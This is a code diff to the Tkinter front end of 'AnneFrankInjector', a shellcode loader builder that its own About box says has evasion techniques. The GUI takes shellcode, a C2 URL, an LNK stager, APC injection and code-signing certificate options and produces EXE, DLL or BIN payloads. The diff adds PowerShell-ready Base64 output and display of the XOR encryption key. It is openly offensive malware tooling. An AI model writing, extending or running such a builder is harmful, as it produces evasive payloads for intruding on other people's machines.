@@ -80,8 +80,8 @@ class Base64EncoderDialog(tk.Toplevel):
 class AnneFrankGUI:
     def __init__(self, root):
         self.root = root
-        self.root.title("AnneFrankInjector - GUI")
-        self.root.geometry("820x1080")  # increased height for new controls
+        self.root.title("AFInjector - GUI")
+        self.root.geometry("820x1080")
 
         # Determine backend path (absolute)
         script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -144,11 +144,28 @@ class AnneFrankGUI:
         ttk.Checkbutton(main_frame, text="Scramble names", variable=self.scramble).grid(row=row, column=0, columnspan=4, sticky="w")
         row += 1
 
+        # ---------- PowerShell Ready ----------
+        self.prepare_ps_frame = ttk.Frame(main_frame)
+        self.prepare_ps_frame.grid(row=row, column=0, columnspan=4, sticky="w")
+        self.prepare_ps = tk.BooleanVar()
+        self.ps_checkbox = ttk.Checkbutton(self.prepare_ps_frame, text="Prepare PowerShell-ready Base64 (BIN only)", variable=self.prepare_ps)
+        self.ps_checkbox.grid(row=0, column=0, sticky="w")
+        row += 1
+
+        # ---------- Debug Encryption ----------
+        self.debug_frame = ttk.Frame(main_frame)
+        self.debug_frame.grid(row=row, column=0, columnspan=4, sticky="w")
+        self.debug_encrypt = tk.BooleanVar()
+        self.debug_checkbox = ttk.Checkbutton(self.debug_frame, text="Show encryption debug info (BIN only)", variable=self.debug_encrypt)
+        self.debug_checkbox.grid(row=0, column=0, sticky="w")
+        row += 1
+
         # ---------- Format ----------
         ttk.Label(main_frame, text="Format:").grid(row=row, column=0, sticky="w")
         self.format = tk.StringVar(value="EXE")
-        ttk.Radiobutton(main_frame, text="EXE", variable=self.format, value="EXE").grid(row=row, column=1, sticky="w")
-        ttk.Radiobutton(main_frame, text="DLL", variable=self.format, value="DLL").grid(row=row, column=2, sticky="w")
+        ttk.Radiobutton(main_frame, text="EXE", variable=self.format, value="EXE", command=self.toggle_ps_ready).grid(row=row, column=1, sticky="w")
+        ttk.Radiobutton(main_frame, text="DLL", variable=self.format, value="DLL", command=self.toggle_ps_ready).grid(row=row, column=2, sticky="w")
+        ttk.Radiobutton(main_frame, text="BIN", variable=self.format, value="BIN", command=self.toggle_ps_ready).grid(row=row, column=3, sticky="w")
         row += 1
 
         # ---------- APC target ----------
@@ -245,6 +262,7 @@ class AnneFrankGUI:
         main_frame.rowconfigure(row+1, weight=1)
 
         self.mode.trace_add("write", self.toggle_staged)
+        self.format.trace_add("write", lambda *args: self.toggle_ps_ready())
 
     def create_menu(self):
         menubar = tk.Menu(self.root)
@@ -263,8 +281,9 @@ class AnneFrankGUI:
 
     def show_about(self):
         messagebox.showinfo(
-            "About AnneFrankInjector",
-            "AnneFrankInjector v2.0\n"
+            "About AFInjector",
+            "AFInjector v2.0\n"
+            "AnneFrankInjector Edition\n"
             "Author: Excalibra\n"
             "GitHub: https://github.com/Excalibra\n\n"
             "Advanced shellcode loader with evasion techniques.\n"
@@ -286,6 +305,18 @@ class AnneFrankGUI:
             self.staged_frame.grid()
         else:
             self.staged_frame.grid_remove()
+        self.toggle_ps_ready()
+
+    def toggle_ps_ready(self):
+        """Enable/disable PowerShell-ready and debug checkboxes based on format selection"""
+        if self.format.get() == "BIN":
+            self.ps_checkbox.config(state="normal")
+            self.debug_checkbox.config(state="normal")
+        else:
+            self.ps_checkbox.config(state="disabled")
+            self.debug_checkbox.config(state="disabled")
+            self.prepare_ps.set(False)  # Uncheck when not BIN format
+            self.debug_encrypt.set(False)  # Uncheck when not BIN format
 
     def generate(self):
         if not self.shellcode_path.get():
@@ -300,6 +331,7 @@ class AnneFrankGUI:
             backend_abs = os.path.abspath(self.backend)
             backend_dir = os.path.dirname(backend_abs)
             backend_script = os.path.basename(backend_abs)
+            xor_key = None  # Variable to store XOR key
 
             cmd = [sys.executable, backend_script, self.mode.get(),
                    "-p", self.shellcode_path.get(),
@@ -328,6 +360,10 @@ class AnneFrankGUI:
                 cmd.append("--lnk-stager")
             if self.c2_url.get().strip():
                 cmd.extend(["--c2-url", self.c2_url.get().strip()])
+            if self.prepare_ps.get():
+                cmd.append("--prepare-ps")
+            if self.debug_encrypt.get():
+                cmd.append("--debug-encrypt")
 
             if self.cert_source.get() != "none" and self.pfx_path.get():
                 cmd.extend(["-pfx", self.pfx_path.get()])
@@ -344,13 +380,43 @@ class AnneFrankGUI:
                                     text=True, bufsize=1, cwd=backend_dir)
 
             for line in proc.stdout:
-                self.output_text.insert(tk.END, line)
+                # Highlight XOR key information in the output
+                if "XOR Key:" in line:
+                    # Extract XOR key value from the line
+                    try:
+                        xor_key = line.split("0x")[1].split(" ")[0]
+                    except:
+                        pass
+                    
+                    # Insert XOR key line with special formatting
+                    start_pos = self.output_text.index(tk.END)
+                    self.output_text.insert(tk.END, line)
+                    end_pos = self.output_text.index(tk.END)
+                    
+                    # Add tag for XOR key line
+                    self.output_text.tag_add("xor_key", start_pos, end_pos)
+                    self.output_text.tag_config("xor_key", foreground="cyan", font=("Courier", 10, "bold"))
+                else:
+                    self.output_text.insert(tk.END, line)
                 self.output_text.see(tk.END)
                 self.root.update_idletasks()
 
             proc.wait()
             if proc.returncode == 0:
-                messagebox.showinfo("Success", f"Done → {self.output_name.get()}.{self.format.get().lower()}")
+                # Create success message with XOR key if available
+                success_msg = f"Done → {self.output_name.get()}.{self.format.get().lower()}"
+                if xor_key:
+                    success_msg += f"\n\nXOR Key: 0x{xor_key}"
+                
+                # Add PowerShell-ready file mention if --prepare-ps was used
+                if self.prepare_ps.get() and self.format.get() == "BIN":
+                    success_msg += f"\n\nPowerShell-ready file: {self.output_name.get()}_ready.txt"
+                
+                # Add debug file mention if --debug-encrypt was used
+                if self.debug_encrypt.get() and self.format.get() == "BIN":
+                    success_msg += f"\n\nDebug file: {self.output_name.get()}_raw_decrypted.bin"
+                
+                messagebox.showinfo("Success", success_msg)
             else:
                 messagebox.showerror("Failed", "See output above")
         except Exception as e:
